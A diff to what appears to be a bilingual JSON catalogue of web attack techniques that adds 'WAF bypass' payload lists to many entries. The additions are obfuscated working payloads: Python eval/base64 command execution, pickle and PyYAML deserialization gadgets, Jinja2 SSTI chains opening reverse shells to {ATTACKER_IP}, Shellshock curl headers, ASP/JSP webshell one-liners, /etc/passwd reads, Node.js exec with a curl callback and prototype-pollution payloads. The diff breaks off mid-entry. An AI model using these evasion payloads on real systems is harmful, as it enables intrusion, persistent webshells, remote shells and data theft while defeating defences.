@@ -18,8 +18,8 @@
         "en": "RCE Remote Code Execution"
       },
       "subCategory": {
-        "zh": "Flask 请求到命令执行",
-        "en": "Flask Request-to-Command Execution"
+        "zh": "代码执行与函数滥用",
+        "en": "Code Execution & Function Abuse"
       },
       "tutorial": {
         "overview": {
@@ -124,6 +124,41 @@
           "zh": "Flask 请求参数命令执行片段清理条件：结束后删除标记与临时脚本，关闭全部子进程，重建 worker，并确认日志未残留凭据、命令输出或业务数据。 清理完成后再次确认该技术路径没有残留可触发状态。",
           "en": "Flask Request-Parameter Command Execution Snippets cleanup condition: Remove markers and temporary scripts, terminate child processes, rebuild the worker, and verify logs contain no credentials, command output, or business data. Recheck that no triggerable state remains for this technique."
         }
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "Base64 外层执行变体",
+            "en": "Base64 Outer Execution"
+          },
+          "command": "exec(__import__('base64').b64decode(request.args.get('c')))",
+          "description": {
+            "zh": "绕过对 __import__('os') 与 popen 组合的检测：payload 整体 base64 传入；成功判据：c 参数代码被执行。",
+            "en": "Evades the __import__('os')+popen pair by passing the whole payload base64-encoded. Success: code from the c parameter executes."
+          }
+        },
+        {
+          "title": {
+            "zh": "getattr 间接调用变体",
+            "en": "getattr Indirect Call"
+          },
+          "command": "getattr(__import__('os'),'po'+'pen')(request.values.get('cmd')).read()",
+          "description": {
+            "zh": "方法名拼接 + getattr 间接获取，打断 popen 明文；成功判据：返回命令输出。",
+            "en": "Method-name splicing via getattr breaks the popen literal. Success: command output returned."
+          }
+        },
+        {
+          "title": {
+            "zh": "eval 字符串变体",
+            "en": "eval String Variant"
+          },
+          "command": "eval('__imp'+'ort__(\"os\").popen(request.args[\"cmd\"]).read()')",
+          "description": {
+            "zh": "代码作为字符串经 eval 执行并拼接 import 关键词，规避 AST/静态特征；成功判据：命令结果回显。",
+            "en": "Executes code as a string via eval with spliced keywords, evading AST/static signatures. Success: command result reflected."
+          }
+        }
       ]
     },
     {
@@ -141,8 +176,8 @@
         "en": "RCE Remote Code Execution"
       },
       "subCategory": {
-        "zh": "Python 动态求值与子进程",
-        "en": "Python Dynamic Evaluation and Subprocesses"
+        "zh": "代码执行与函数滥用",
+        "en": "Code Execution & Function Abuse"
       },
       "tutorial": {
         "overview": {
@@ -247,6 +282,41 @@
           "zh": "Python/Django 动态执行表达式清理条件：结束后删除标记与临时脚本，关闭全部子进程，重建 worker，并确认日志未残留凭据、命令输出或业务数据。 清理完成后再次确认该技术路径没有残留可触发状态。",
           "en": "Python and Django Dynamic Execution Expressions cleanup condition: Remove markers and temporary scripts, terminate child processes, rebuild the worker, and verify logs contain no credentials, command output, or business data. Recheck that no triggerable state remains for this technique."
         }
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "无 import 关键词变体",
+            "en": "No-Keyword Import Variant"
+          },
+          "command": "__import__('subprocess').getoutput(request.GET['cmd'])",
+          "description": {
+            "zh": "绕过对 “import os;os.system” 组合的检测：__import__ 动态加载 subprocess；成功判据：返回命令输出。",
+            "en": "Evades the \"import os;os.system\" pair by dynamically loading subprocess via __import__. Success: command output returned."
+          }
+        },
+        {
+          "title": {
+            "zh": "exec Base64 变体",
+            "en": "exec Base64 Variant"
+          },
+          "command": "exec(__import__('base64').b64decode('X19pbXBvcnRfXygnc3VicHJvY2VzcycpLmdldG91dHB1dCgnaWQnKQ=='))",
+          "description": {
+            "zh": "攻击语句整体 base64 后 exec，静态无任何敏感关键词；成功判据：执行结果可观测。",
+            "en": "Base64-encodes the whole statement before exec so no sensitive keywords remain statically. Success: execution observable."
+          }
+        },
+        {
+          "title": {
+            "zh": "字符串拼接 eval 变体",
+            "en": "Spliced eval Variant"
+          },
+          "command": "eval(\"__import__('o\"+\"s').popen('id').read()\")",
+          "description": {
+            "zh": "模块名拆分拼接，规避 os 完整 token 匹配；成功判据：id 输出回显。",
+            "en": "Splits the module name to evade full-token matching on os. Success: id output reflected."
+          }
+        }
       ]
     },
     {
@@ -264,8 +334,8 @@
         "en": "RCE Remote Code Execution"
       },
       "subCategory": {
-        "zh": "Pickle 指令流精简集",
-        "en": "Pickle Opcode Compact Set"
+        "zh": "反序列化",
+        "en": "Insecure Deserialization"
       },
       "tutorial": {
         "overview": {
@@ -371,6 +441,41 @@
       "tags": [
         "webshell",
         "python_pickle_rce"
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "posix 模块 sink 变体",
+            "en": "posix Module Sink Variant"
+          },
+          "command": "cposix\nsystem\n(S'id'\ntR.",
+          "description": {
+            "zh": "用 cposix.system 代替 cos.system，绕过针对 os 模块名的 gadget 匹配；成功判据：pickle.loads 执行 id。",
+            "en": "Uses cposix.system instead of cos.system to evade gadget matching on the os module name. Success: pickle.loads executes id."
+          }
+        },
+        {
+          "title": {
+            "zh": "builtins eval 字符串载荷",
+            "en": "builtins eval String Payload"
+          },
+          "command": "c__builtin__\neval\n(V__import__('os').system('id')\np0\ntp1\nRp2\n.",
+          "description": {
+            "zh": "把攻击代码放进 eval 的字符串参数，避免 system opcode 直接出现；成功判据：命令执行且返回码对象化。",
+            "en": "Moves the attack code into an eval string argument so the system opcode never appears directly. Success: command executes and the return code is materialized."
+          }
+        },
+        {
+          "title": {
+            "zh": "reduce 装饰序列化生成",
+            "en": "reduce-Decorated Generation"
+          },
+          "command": "class E:\n    def __reduce__(self):\n        return __import__('os').system, ('echo aWQ=|base64 -d|sh',)\n__import__('pickle').dumps(E())",
+          "description": {
+            "zh": "命令本身 base64 化后再序列化，双层规避 opcode 与命令明文特征；成功判据：loads 时执行解码命令。",
+            "en": "Base64-encodes the command before pickling, layering evasion over both opcode and plaintext signatures. Success: loads executes the decoded command."
+          }
+        }
       ]
     },
     {
@@ -2479,8 +2584,8 @@
         "en": "SSTI Template Injection"
       },
       "subCategory": {
-        "zh": "Jinja2 对象图到进程执行",
-        "en": "Jinja2 Object Graph to Process Execution"
+        "zh": "Jinja2 与 Python 系",
+        "en": "Jinja2 & Python Family"
       },
       "tutorial": {
         "overview": {
@@ -2585,6 +2690,52 @@
           "zh": "Jinja2 SSTI 进程执行链清理条件：结束后删除测试模板和缓存、轮换临时会话、重建 worker，并确认 globals、调试器和测试路由未残留。 清理完成后再次确认该技术路径没有残留可触发状态。",
           "en": "Jinja2 SSTI Process Execution Chains cleanup condition: Delete test templates and caches, rotate temporary sessions, rebuild the worker, and verify globals, debuggers, and test routes are removed. Recheck that no triggerable state remains for this technique."
         }
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "lipsum 全局链",
+            "en": "lipsum gadget chain"
+          },
+          "command": "{{lipsum.__globals__.os.popen('nc -e /bin/sh {ATTACKER_IP} {LPORT}').read()}}",
+          "description": {
+            "zh": "绕过 request.application 特征：改由 lipsum 全局取 os。判据：攻击机收到 shell。",
+            "en": "Reaches os via lipsum globals instead of request. Success: shell received on the listener."
+          }
+        },
+        {
+          "title": {
+            "zh": "cycler 全局链",
+            "en": "cycler gadget chain"
+          },
+          "command": "{{cycler.__init__.__globals__.os.popen('bash -c \"bash -i >& /dev/tcp/{ATTACKER_IP}/{LPORT} 0>&1\"').read()}}",
+          "description": {
+            "zh": "纯 bash 反弹免 nc 依赖。判据：收到交互 shell。",
+            "en": "Pure-bash reverse shell without nc. Success: interactive shell obtained."
+          }
+        },
+        {
+          "title": {
+            "zh": "attr 过滤器链",
+            "en": "attr-filter chain"
+          },
+          "command": "{{url_for|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('id')|attr('read')()}}",
+          "description": {
+            "zh": "全程无点号绕过 . 过滤。判据：回显 uid。",
+            "en": "No dots anywhere to dodge dot filters. Success: uid echoed."
+          }
+        },
+        {
+          "title": {
+            "zh": "规避变体：免 netcat fifo 反弹",
+            "en": "netcat-free fifo callback"
+          },
+          "command": "{{config.__class__.__init__.__globals__['os'].popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ATTACKER_IP} {LPORT} >/tmp/f &').read()}}",
+          "description": {
+            "zh": "规避点：目标无交互工具时用 fifo 管道常驻反弹。判据：监听端口收到 shell。",
+            "en": "fifo pipe keeps a callback alive without interactive tools. Success: listener receives the shell."
+          }
+        }
       ]
     },
     {
@@ -2602,8 +2753,8 @@
         "en": "RCE Remote Code Execution"
       },
       "subCategory": {
-        "zh": "Shellshock CGI Header 注入",
-        "en": "Shellshock CGI Header Injection"
+        "zh": "命令注入",
+        "en": "Command Injection"
       },
       "tutorial": {
         "overview": {
@@ -2715,6 +2866,41 @@
       "tags": [
         "webshell",
         "shellshock_via_curl"
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "User-Agent 载体变体",
+            "en": "User-Agent Carrier Variant"
+          },
+          "command": "curl --include --max-time 5 -A '() { :;}; printf \"SHELLSHOCK_UA_MARKER\"' http://{LAB_APP}/cgi-bin/test.sh",
+          "description": {
+            "zh": "绕过仅检查 Cookie 头的 WAF 规则：把环境变量函数定义移到 User-Agent；成功判据：响应体出现 UA_MARKER。",
+            "en": "Bypasses WAFs inspecting only the Cookie header by moving the function definition into User-Agent. Success: UA_MARKER appears in the response body."
+          }
+        },
+        {
+          "title": {
+            "zh": "Referer 与函数体变形",
+            "en": "Referer and Function-Body Mutation"
+          },
+          "command": "curl --include --max-time 5 -H 'Referer: () { ignored;}; printf \"SHELLSHOCK_REF_MARKER\"' http://{LAB_APP}/cgi-bin/test.sh",
+          "description": {
+            "zh": "改用 Referer 头并替换函数体 { :;} 为 { ignored;}，规避 () { :;} 特征匹配；成功判据：REF_MARKER 回显。",
+            "en": "Switches to the Referer header and mutates the function body from { :;} to { ignored;} to evade the () { :;} signature. Success: REF_MARKER echoed."
+          }
+        },
+        {
+          "title": {
+            "zh": "Base64 载荷外带变体",
+            "en": "Base64 Payload Variant"
+          },
+          "command": "curl --include --max-time 5 -H 'X-Session: () { :;}; echo cHJpbnRmIFNIRUxMU0hPQ0tfWF9NQVJLRVI=|base64 -d|sh' http://{LAB_APP}/cgi-bin/test.sh",
+          "description": {
+            "zh": "用自定义头携带注入并把命令 base64 编码，绕过明文命令检测；成功判据：响应含 X_MARKER。",
+            "en": "Carries the injection in a custom header with the command base64-encoded, evading plaintext detection. Success: X_MARKER present in the response."
+          }
+        }
       ]
     },
     {
@@ -2732,8 +2918,8 @@
         "en": "RCE Remote Code Execution"
       },
       "subCategory": {
-        "zh": "PHP WebShell 请求处理",
-        "en": "PHP Webshell Request Handling"
+        "zh": "WebShell 与权限维持",
+        "en": "WebShell & Persistence"
       },
       "tutorial": {
         "overview": {
@@ -2975,8 +3161,8 @@
         "en": "RCE Remote Code Execution"
       },
       "subCategory": {
-        "zh": "PHP 大小写规范化",
-        "en": "PHP Case Normalization"
+        "zh": "WebShell 与权限维持",
+        "en": "WebShell & Persistence"
       },
       "tutorial": {
         "overview": {
@@ -3095,8 +3281,8 @@
         "en": "RCE Remote Code Execution"
       },
       "subCategory": {
-        "zh": "PHP 编码后代码求值",
-        "en": "PHP Decode-Then-Evaluate"
+        "zh": "WebShell 与权限维持",
+        "en": "WebShell & Persistence"
       },
       "tutorial": {
         "overview": {
@@ -3215,8 +3401,8 @@
         "en": "RCE Remote Code Execution"
       },
       "subCategory": {
-        "zh": "PHP 多阶段解码求值",
-        "en": "PHP Multi-Stage Decode and Evaluate"
+        "zh": "WebShell 与权限维持",
+        "en": "WebShell & Persistence"
       },
       "tutorial": {
         "overview": {
@@ -3464,8 +3650,8 @@
         "en": "RCE Remote Code Execution"
       },
       "subCategory": {
-        "zh": "PHP 字符串异或与动态调用",
-        "en": "PHP String XOR and Dynamic Calls"
+        "zh": "WebShell 与权限维持",
+        "en": "WebShell & Persistence"
       },
       "tutorial": {
         "overview": {
@@ -3584,8 +3770,8 @@
         "en": "RCE Remote Code Execution"
       },
       "subCategory": {
-        "zh": "IIS ASP/ASP.NET WebShell",
-        "en": "IIS ASP and ASP.NET Webshells"
+        "zh": "WebShell 与权限维持",
+        "en": "WebShell & Persistence"
       },
       "tutorial": {
         "overview": {
@@ -3690,6 +3876,41 @@
           "zh": "Classic ASP 与 ASP.NET WebShell 处理器清理条件：结束后删除标记与临时脚本，关闭全部子进程，重建 worker，并确认日志未残留凭据、命令输出或业务数据。 清理完成后再次确认该技术路径没有残留可触发状态。",
           "en": "Classic ASP and ASP.NET Webshell Handlers cleanup condition: Remove markers and temporary scripts, terminate child processes, rebuild the worker, and verify logs contain no credentials, command output, or business data. Recheck that no triggerable state remains for this technique."
         }
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "大小写与空格变形",
+            "en": "Case and Whitespace Mutation"
+          },
+          "command": "<% eVaL   ReQuESt(\"cmd\")%>",
+          "description": {
+            "zh": "绕过对 <%eval request( 精确串的匹配：VBScript 标识符大小写不敏感且容忍参数前空格；成功判据：cmd 参数代码被执行。",
+            "en": "Bypasses exact matching of <%eval request( since VBScript identifiers are case-insensitive and tolerate argument spacing. Success: code from the cmd parameter executes."
+          }
+        },
+        {
+          "title": {
+            "zh": "Session 载体变体",
+            "en": "Session Carrier Variant"
+          },
+          "command": "<%execute session(\"cmd\")%>",
+          "description": {
+            "zh": "载荷改经 Session 传递，避开对 Request( 取值特征的静态查杀；成功判据：session 注入后代码执行。",
+            "en": "Moves payload delivery to Session to evade static scanning of Request( access patterns. Success: code executes after session injection."
+          }
+        },
+        {
+          "title": {
+            "zh": "Jscript ASPX 变体",
+            "en": "Jscript ASPX Variant"
+          },
+          "command": "<%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"cmd\"],\"unsafe\");%>",
+          "description": {
+            "zh": "ASPX 页面改用 Jscript 语言声明，混淆 eval 语义并绕过 C#/VB 特征；成功判据：ASPX 处理器执行传入代码。",
+            "en": "Declares Jscript on an ASPX page to blur eval semantics and evade C#/VB signatures. Success: the ASPX handler executes the supplied code."
+          }
+        }
       ]
     },
     {
@@ -3707,8 +3928,8 @@
         "en": "RCE Remote Code Execution"
       },
       "subCategory": {
-        "zh": "Classic ASP 请求执行",
-        "en": "Classic ASP Request Execution"
+        "zh": "WebShell 与权限维持",
+        "en": "WebShell & Persistence"
       },
       "tutorial": {
         "overview": {
@@ -3813,6 +4034,41 @@
           "zh": "Classic ASP 动态执行与文件读取清理条件：结束后删除标记与临时脚本，关闭全部子进程，重建 worker，并确认日志未残留凭据、命令输出或业务数据。 清理完成后再次确认该技术路径没有残留可触发状态。",
           "en": "Classic ASP Dynamic Execution and File Reading cleanup condition: Remove markers and temporary scripts, terminate child processes, rebuild the worker, and verify logs contain no credentials, command output, or business data. Recheck that no triggerable state remains for this technique."
         }
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "ExecuteGlobal 变体",
+            "en": "ExecuteGlobal Variant"
+          },
+          "command": "<%ExecuteGlobal(Request(\"a\"))%>",
+          "description": {
+            "zh": "换 ExecuteGlobal 全局执行，绕过仅匹配 Execute( 的特征；成功判据：参数代码在全局命名空间执行。",
+            "en": "Swaps to ExecuteGlobal for global-scope execution, evading Execute(-only signatures. Success: parameter code runs in global scope."
+          }
+        },
+        {
+          "title": {
+            "zh": "条件包裹变体",
+            "en": "Conditional Wrap Variant"
+          },
+          "command": "<%If Request(\"a\")<>\"\" Then Eval(Request(\"a\"))%>",
+          "description": {
+            "zh": "用 If 条件结构包裹调用，打散 eval(request( 连续特征；成功判据：带参数请求触发执行。",
+            "en": "Wraps the call in an If conditional to break the contiguous eval(request( signature. Success: execution triggers when the parameter is present."
+          }
+        },
+        {
+          "title": {
+            "zh": "大小写混合变体",
+            "en": "Mixed-Case Variant"
+          },
+          "command": "<%eXeCuTe rEqUeSt(\"a\")%>",
+          "description": {
+            "zh": "全标识符混合大小写，规避大小写敏感的正则；成功判据：代码执行成功。",
+            "en": "Applies mixed case across identifiers to defeat case-sensitive regexes. Success: code executes."
+          }
+        }
       ]
     },
     {
@@ -3830,8 +4086,8 @@
         "en": "RCE Remote Code Execution"
       },
       "subCategory": {
-        "zh": "JSP/Servlet 进程执行",
-        "en": "JSP and Servlet Process Execution"
+        "zh": "WebShell 与权限维持",
+        "en": "WebShell & Persistence"
       },
       "tutorial": {
         "overview": {
@@ -3936,6 +4192,41 @@
           "zh": "JSP Runtime 与 ProcessBuilder WebShell清理条件：结束后删除标记与临时脚本，关闭全部子进程，重建 worker，并确认日志未残留凭据、命令输出或业务数据。 清理完成后再次确认该技术路径没有残留可触发状态。",
           "en": "JSP Runtime and ProcessBuilder Webshells cleanup condition: Remove markers and temporary scripts, terminate child processes, rebuild the worker, and verify logs contain no credentials, command output, or business data. Recheck that no triggerable state remains for this technique."
         }
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "Base64 命令变体",
+            "en": "Base64 Command Variant"
+          },
+          "command": "<%Runtime.getRuntime().exec(new String(java.util.Base64.getDecoder().decode(request.getParameter(\"cmd\"))));%>",
+          "description": {
+            "zh": "命令以 base64 传入运行时解码，规避命令明文与常见参数值特征；成功判据：解码后的命令被执行。",
+            "en": "Decodes a base64 command at runtime to evade plaintext command and common parameter-value signatures. Success: the decoded command executes."
+          }
+        },
+        {
+          "title": {
+            "zh": "反射调用变体",
+            "en": "Reflection Invocation Variant"
+          },
+          "command": "<%Class.forName(\"java.lang.Runtime\").getMethod(\"exec\",new Class[]{String.class}).invoke(Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null),request.getParameter(\"cmd\"));%>",
+          "description": {
+            "zh": "经 Class/Method 反射链调用 exec，源码中无 Runtime.getRuntime().exec 直连特征；成功判据：进程创建可观测。",
+            "en": "Invokes exec through a reflection chain so no direct Runtime.getRuntime().exec signature appears. Success: process creation observable."
+          }
+        },
+        {
+          "title": {
+            "zh": "参数名字节构造变体",
+            "en": "Parameter-Name Byte Construction"
+          },
+          "command": "<%Runtime.getRuntime().exec(request.getParameter(new String(new byte[]{99,109,100})));%>",
+          "description": {
+            "zh": "参数名 cmd 用字节数组构造，避开 getParameter(\"cmd\") 静态特征；成功判据：cmd 参数命令执行。",
+            "en": "Builds the cmd parameter name from a byte array to avoid the static getParameter(\"cmd\") signature. Success: the cmd parameter command executes."
+          }
+        }
       ]
     },
     {
@@ -3953,8 +4244,8 @@
         "en": "RCE Remote Code Execution"
       },
       "subCategory": {
-        "zh": "JSP WebShell 文件读取",
-        "en": "JSP Webshell File Reading"
+        "zh": "WebShell 与权限维持",
+        "en": "WebShell & Persistence"
       },
       "tutorial": {
         "overview": {
@@ -4056,6 +4347,41 @@
           "zh": "JSP 本地文件读取片段清理条件：测试后删除挂载文件和临时 WebShell，清空响应缓存并重建容器，确认报告与日志只保留随机标记。 清理完成后再次确认该技术路径没有残留可触发状态。",
           "en": "JSP Local File Read Snippets cleanup condition: Remove mounted files and temporary webshells, clear response caches, rebuild the container, and verify reports and logs retain only the random marker. Recheck that no triggerable state remains for this technique."
         }
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "NIO 读取变体",
+            "en": "NIO Read Variant"
+          },
+          "command": "<%=new String(java.nio.file.Files.readAllBytes(java.nio.file.Paths.get(request.getParameter(\"f\"))))%>",
+          "description": {
+            "zh": "换 NIO Files API 且路径参数化，绕过 Scanner+定长路径特征；成功判据：任意 f 路径内容回显。",
+            "en": "Switches to the NIO Files API with a parameterized path to evade Scanner plus fixed-path signatures. Success: any f path contents are echoed."
+          }
+        },
+        {
+          "title": {
+            "zh": "Base64 输出变体",
+            "en": "Base64 Output Variant"
+          },
+          "command": "<%=java.util.Base64.getEncoder().encodeToString(new java.io.FileInputStream(\"/flag\").readAllBytes())%>",
+          "description": {
+            "zh": "输出 base64 化，规避响应侧对敏感文件内容的检测；成功判据：响应可解码出 flag。",
+            "en": "Base64-encodes output to evade response-side inspection of sensitive file contents. Success: response decodes to the flag."
+          }
+        },
+        {
+          "title": {
+            "zh": "char 数组路径变体",
+            "en": "char Array Path Variant"
+          },
+          "command": "<%out.print(new java.util.Scanner(new java.io.File(new String(new char[]{'/','e','t','c','/','p','a','s','s','w','d'}))).useDelimiter(\"\\\\A\").next());%>",
+          "description": {
+            "zh": "路径以 char 数组拼接，规避 /etc/passwd 明文匹配；成功判据：文件内容输出。",
+            "en": "Assembles the path from a char array to evade plaintext /etc/passwd matching. Success: file contents printed."
+          }
+        }
       ]
     },
     {
@@ -4073,8 +4399,8 @@
         "en": "RCE Remote Code Execution"
       },
       "subCategory": {
-        "zh": "Python 执行上下文文件读取",
-        "en": "Python Execution-Context File Reading"
+        "zh": "WebShell 与权限维持",
+        "en": "WebShell & Persistence"
       },
       "tutorial": {
         "overview": {
@@ -4176,6 +4502,41 @@
           "zh": "Python 本地文件读取表达式清理条件：测试后删除挂载文件和临时 WebShell，清空响应缓存并重建容器，确认报告与日志只保留随机标记。 清理完成后再次确认该技术路径没有残留可触发状态。",
           "en": "Python Local File Read Expressions cleanup condition: Remove mounted files and temporary webshells, clear response caches, rebuild the container, and verify reports and logs retain only the random marker. Recheck that no triggerable state remains for this technique."
         }
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "popen 读文件变体",
+            "en": "popen File Read Variant"
+          },
+          "command": "__import__('os').popen('cat /etc/passwd').read()",
+          "description": {
+            "zh": "绕过对 open(...).read() 模式的检测：改经 os.popen 执行；成功判据：返回 passwd 内容。",
+            "en": "Bypasses detection of the open(...).read() pattern by routing through os.popen. Success: passwd contents returned."
+          }
+        },
+        {
+          "title": {
+            "zh": "exec Base64 变体",
+            "en": "exec Base64 Variant"
+          },
+          "command": "exec(__import__('base64').b64decode('b3BlbignL2ZsYWcnKS5yZWFkKCk='))",
+          "description": {
+            "zh": "载荷 base64 化后 exec，静态不含 open/flag 关键词；成功判据：执行结果可见。",
+            "en": "Base64-encodes the payload before exec so no open/flag keywords remain. Success: execution result visible."
+          }
+        },
+        {
+          "title": {
+            "zh": "codecs 备用 API 变体",
+            "en": "codecs Alternate API Variant"
+          },
+          "command": "__import__('codecs').open('/flag',encoding='utf-8').read()",
+          "description": {
+            "zh": "用 codecs.open 替代内置 open，绕过针对 open( 的过滤；成功判据：返回 flag 内容。",
+            "en": "Replaces builtin open with codecs.open to bypass filters targeting open(. Success: flag contents returned."
+          }
+        }
       ]
     },
     {
@@ -4193,8 +4554,8 @@
         "en": "RCE Remote Code Execution"
       },
       "subCategory": {
-        "zh": "Node.js 运行时能力访问",
-        "en": "Node.js Runtime Capability Access"
+        "zh": "WebShell 与权限维持",
+        "en": "WebShell & Persistence"
       },
       "tutorial": {
         "overview": {
@@ -4299,6 +4660,41 @@
           "zh": "Node.js 子进程与文件读取表达式清理条件：结束后删除标记与临时脚本，关闭全部子进程，重建 worker，并确认日志未残留凭据、命令输出或业务数据。 清理完成后再次确认该技术路径没有残留可触发状态。",
           "en": "Node.js Child-Process and File-Read Expressions cleanup condition: Remove markers and temporary scripts, terminate child processes, rebuild the worker, and verify logs contain no credentials, command output, or business data. Recheck that no triggerable state remains for this technique."
         }
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "mainModule 链变体",
+            "en": "mainModule Chain Variant"
+          },
+          "command": "global.process.mainModule.require('child_process').execSync('id').toString()",
+          "description": {
+            "zh": "绕过对 require('child_process') 直调的检测：经 process.mainModule 间接加载；成功判据：返回 uid。",
+            "en": "Bypasses direct require('child_process') detection by loading via process.mainModule. Success: uid returned."
+          }
+        },
+        {
+          "title": {
+            "zh": "eval Buffer 变体",
+            "en": "eval Buffer Variant"
+          },
+          "command": "eval(new Buffer('cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWNTeW5jKCdpZCcpLnRvU3RyaW5nKCk=','base64').toString())",
+          "description": {
+            "zh": "代码 base64 后 eval 执行，规避 child_process 关键词；成功判据：命令输出回显。",
+            "en": "Base64-encodes code before eval to evade child_process keywords. Success: command output reflected."
+          }
+        },
+        {
+          "title": {
+            "zh": "require 拼接变体",
+            "en": "require Splicing Variant"
+          },
+          "command": "require('child_'+'process').exec('curl http://{ATTACKER_HOST}/node').toString()",
+          "description": {
+            "zh": "模块名字符串拼接 + curl 外带，规避关键词组合与输出检测；成功判据：{ATTACKER_HOST} 收到回连。",
+            "en": "Splices the module name and exfils via curl to evade keyword pairing and output inspection. Success: {ATTACKER_HOST} receives the callback."
+          }
+        }
       ]
     },
     {
@@ -4316,8 +4712,8 @@
         "en": "Prototype Pollution"
       },
       "subCategory": {
-        "zh": "Node.js 子进程选项污染",
-        "en": "Node.js Child-Process Option Pollution"
+        "zh": "污染利用链到 RCE 与客户端",
+        "en": "Exploitation Chains to RCE & Client-side"
       },
       "tutorial": {
         "overview": {
@@ -4419,6 +4815,41 @@
           "zh": "Node.js 原型污染到进程选项清理条件：每个 JSON 后销毁 worker；完成后重启应用、确认 Object.prototype 无哨兵并清空队列/缓存。 清理完成后再次确认该技术路径没有残留可触发状态。",
           "en": "Node.js Prototype Pollution to Process Options cleanup condition: Destroy the worker after each JSON; restart the app, verify Object.prototype has no sentinel, and clear queues and caches. Recheck that no triggerable state remains for this technique."
         }
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "NODE_OPTIONS require 变形",
+            "en": "NODE_OPTIONS require Mutation"
+          },
+          "command": "{\"__proto__\": {\"NODE_OPTIONS\": \"--require=/tmp/{LAB_PAYLOAD_JS}\"}}\n{\"constructor\": {\"prototype\": {\"NODE_OPTIONS\": \"--require=/tmp/{LAB_PAYLOAD_JS}\"}}}",
+          "description": {
+            "zh": "绕过对 child_process 显式注入 env 的检测：污染 NODE_OPTIONS 使后续任意 node 调用自动预载载荷。成功判据：下次进程派生时载荷执行。",
+            "en": "Evades detection of explicit env injection into child_process by polluting NODE_OPTIONS so any later node invocation preloads the payload. Success: the payload executes on the next process spawn."
+          }
+        },
+        {
+          "title": {
+            "zh": "shell 字段等价变形",
+            "en": "shell Field Equivalent Mutation"
+          },
+          "command": "{\"__proto__\": {\"shell\": \"/bin/dash\"}}\n{\"__proto__\": {\"shell\": \"powershell.exe\", \"windowsVerbatimArguments\": false}}",
+          "description": {
+            "zh": "绕过仅监控 /bin/bash 注入的规则：换 shell 解释器路径等价达成命令执行。成功判据：派生命令经指定解释器执行。",
+            "en": "Evades rules watching only /bin/bash injection by switching to an equivalent interpreter path. Success: spawned commands execute through the specified shell."
+          }
+        },
+        {
+          "title": {
+            "zh": "argv0/envshell 组合变形",
+            "en": "argv0/envshell Combo Mutation"
+          },
+          "command": "{\"__proto__\": {\"argv0\": \"SH\", \"env\": {\"SH\": \"-c whoami\"}}}\n{\"__proto__\": {\"env\": {\"NODE_OPTIONS\": \"--require={LAB_PAYLOAD_JS}\"}}}",
+          "description": {
+            "zh": "以 argv0+env 组合替代显式 shell 字段绕过字段级检测。成功判据：组合注入使命令执行成功。",
+            "en": "Using argv0+env instead of an explicit shell field bypasses field-level detection. Success: the combined injection achieves command execution."
+          }
+        }
       ]
     },
     {
@@ -4436,8 +4867,8 @@
         "en": "RCE Remote Code Execution"
       },
       "subCategory": {
-        "zh": "Ruby 进程与文件 API",
-        "en": "Ruby Process and File APIs"
+        "zh": "WebShell 与权限维持",
+        "en": "WebShell & Persistence"
       },
       "tutorial": {
         "overview": {
@@ -4542,6 +4973,41 @@
           "zh": "Ruby 命令执行表达式集合清理条件：结束后删除标记与临时脚本，关闭全部子进程，重建 worker，并确认日志未残留凭据、命令输出或业务数据。 清理完成后再次确认该技术路径没有残留可触发状态。",
           "en": "Ruby Command Execution Expression Set cleanup condition: Remove markers and temporary scripts, terminate child processes, rebuild the worker, and verify logs contain no credentials, command output, or business data. Recheck that no triggerable state remains for this technique."
         }
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "反引号执行变体",
+            "en": "Backtick Execution Variant"
+          },
+          "command": "`cat /flag`",
+          "description": {
+            "zh": "绕过对 system( 的检测：反引号语法等价执行；成功判据：返回 flag 内容。",
+            "en": "Bypasses system( detection using equivalent backtick syntax. Success: flag contents returned."
+          }
+        },
+        {
+          "title": {
+            "zh": "IO.popen 变体",
+            "en": "IO.popen Variant"
+          },
+          "command": "IO.popen('id').read",
+          "description": {
+            "zh": "换 IO.popen sink 并直接读输出；成功判据：uid 信息回显。",
+            "en": "Switches the sink to IO.popen and reads output directly. Success: uid info echoed."
+          }
+        },
+        {
+          "title": {
+            "zh": "%x 字面量变体",
+            "en": "%x Literal Variant"
+          },
+          "command": "%x(whoami)",
+          "description": {
+            "zh": "Ruby 的 %x() 百分号字面量执行命令，规避反引号与 system 特征；成功判据：返回用户名。",
+            "en": "Uses the %x() percent literal for command execution, evading backtick and system signatures. Success: username returned."
+          }
+        }
       ]
     },
     {
@@ -4559,8 +5025,8 @@
         "en": "RCE Remote Code Execution"
       },
       "subCategory": {
-        "zh": "PyYAML 执行标签示例",
-        "en": "PyYAML Execution-Tag Samples"
+        "zh": "反序列化",
+        "en": "Insecure Deserialization"
       },
       "tutorial": {
         "overview": {
@@ -4666,6 +5132,41 @@
       "tags": [
         "webshell",
         "python_yaml"
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "subprocess.getoutput 变体",
+            "en": "subprocess.getoutput Variant"
+          },
+          "command": "!!python/object/apply:subprocess.getoutput ['cat /flag']",
+          "description": {
+            "zh": "换 subprocess sink 绕过 os.system gadget 特征；成功判据：YAML.unsafe_load 返回 flag 内容。",
+            "en": "Swaps the sink to subprocess to evade os.system gadget signatures. Success: YAML.unsafe_load returns the flag content."
+          }
+        },
+        {
+          "title": {
+            "zh": "object/new 加 popen",
+            "en": "object/new with popen"
+          },
+          "command": "!!python/object/new:os.popen ['id']",
+          "description": {
+            "zh": "object/new 标签构造 os.popen 对象，规避 apply:os.system 字面量；成功判据：read() 时得到输出。",
